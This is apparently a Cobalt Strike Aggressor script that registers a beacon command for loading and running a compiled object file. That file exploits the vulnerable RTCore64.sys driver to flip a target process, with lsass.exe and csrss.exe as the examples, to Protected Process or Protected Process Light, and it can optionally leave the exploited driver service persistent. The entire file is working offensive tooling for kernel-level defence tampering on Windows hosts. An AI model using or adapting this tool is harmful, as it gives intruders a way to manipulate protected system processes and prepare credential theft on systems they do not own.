# author @mooolight

beacon_command_register(
	"byovd-rtcore64-tokenconf-flipprocprotection", "Flip the protection of the target process to Fully Protected Process or Process Protected Light by exploiting the vulnerable RTCore64.sys.",
	"INFO:\nFlip the protection of the target process to Fully Protected Process or Process Protected Light by exploiting the vulnerable RTCore64.sys.\n\n" .
	"ARGUMENTS:\n[<targetProc>]: Target process for the action parameter.\n[<prot_type>]: When flipping the process protection , choose whether to flip to Process Protection Light or Process Protection.[<pers>]: Status whether the exploited service will persist or not.\n\n" .
	"USAGE:\nbyovd-rtcore64-tokenconf-flipprocprotection <targetProc> <ppl | pp> <pers>\n\n".
	"EXAMPLES:\nbyovd-rtcore64-tokenconf-flipprocprotection <lsass|csrss>.exe ppl FALSE\n\n");

alias byovd-rtcore64-exploit {
    $bid = $1;
	$targetProc = $2;
    $prot_type = $3;
    $pers = $4;
    
	if ($targetProc eq "") {
        berror($bid, "Please specify the target process to modify either the elevation or token privilege(s).\n");
        return;
    }
    if ($prot_type eq "") {
        berror($bid, "Please specify the target process' protection type.\n");
        return;
    }
    if ($pers eq "") {
        berror($bid, "Please specify whether the exploited service will persist or not.\n");
        return;
    }
	
    # Read in the right BOF file
    $handle = openf(script_resource("byovd-rtcore64-tokenconf-flipprocprotection-bof.o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $arg_data  = bof_pack($bid,"zzz",$targetProc,$prot_type,$pers);

    blog($bid, "Flip the protection of the target process to Fully Protected Process or Process Protected Light by exploiting the vulnerable RTCore64.sys.");
    beacon_inline_execute($bid, $data, "go", $arg_data);
}
